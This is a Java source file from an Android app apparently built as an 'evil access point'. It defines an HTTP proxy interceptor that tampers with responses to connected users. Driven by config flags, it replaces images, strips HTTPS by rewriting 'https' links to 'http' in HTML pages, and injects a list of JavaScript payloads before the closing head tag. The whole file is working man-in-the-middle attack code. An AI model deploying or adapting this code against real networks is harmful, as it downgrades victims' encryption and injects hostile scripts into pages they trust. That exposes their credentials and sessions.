package com.nibiru.evil_ap.proxy;


import android.content.SharedPreferences;

import com.nibiru.evil_ap.ConfigTags;
import com.nibiru.evil_ap.SharedClass;

import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.util.List;

import okhttp3.Interceptor;
import okhttp3.Response;
import okhttp3.ResponseBody;

/**
 * Created by Nibiru on 2016-12-23.
 */

public class InterceptorResponse implements Interceptor{
    /**************************************CLASS FIELDS********************************************/
    private SharedClass mSharedObj;
    private SharedPreferences mConfig;
    /**************************************CLASS METHODS*******************************************/
    public InterceptorResponse(SharedClass shrObj, SharedPreferences config){
        super();
        mSharedObj = shrObj;
        mConfig = config;
    }
    @Override
    public Response intercept(Chain chain) throws IOException {
        Response originalResponse = chain.proceed(chain.request());

        int bodyLen;
        byte[] bodyBytes;
        String contentTypeStr = originalResponse.header("Content-Type");
        boolean imgSwapFlag = contentTypeStr != null && contentTypeStr.contains("image")
                && mConfig.getBoolean(ConfigTags.imgReplace.toString(), false);
        if (imgSwapFlag) {
            bodyBytes = mSharedObj.getImgData();
            bodyLen = mSharedObj.getImgDataLength();
        }
        else{
            //EDIT RESPONSE HERE (if it is text)
            bodyBytes = originalResponse.body().bytes();
            bodyLen = bodyBytes.length;
            if (contentTypeStr != null && contentTypeStr.contains("html")) {
                boolean sslStrip = mConfig.getBoolean(ConfigTags.sslStrip.toString(), false);
                boolean jsInject = mConfig.getBoolean(ConfigTags.jsInject.toString(), false);
                if (bodyBytes.length > 0  && (sslStrip || jsInject)) {
                    bodyBytes = editBytes(bodyBytes, sslStrip, jsInject);
                    bodyLen = bodyBytes.length;
                }
            }
        }
        //create new body
        ResponseBody body = ResponseBody.create(originalResponse.body().contentType(), bodyBytes);
        //create new response and close old body response
        originalResponse.close();
        return originalResponse.newBuilder()
                .removeHeader("Transfer-Encoding")
                .header("Content-Length", Integer.toString(bodyLen))
                .body(body).build();
    }

    private byte[] editBytes(byte[] bytesBody, Boolean sslStrip, Boolean jsInject) {
        try {
            String response = new String(bytesBody, "UTF-8");
            if (sslStrip) {
                response = response.replaceAll("https", "http");
            }
            if (jsInject){
                List<String> payloads = mSharedObj.getPayloads();
                String full = "";
                for(String p: payloads){
                    full += p;
                }
                response = response.replaceAll("</head>", full + "</head>");
            }
            return response.getBytes();
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
            return null;
        }
    }
}
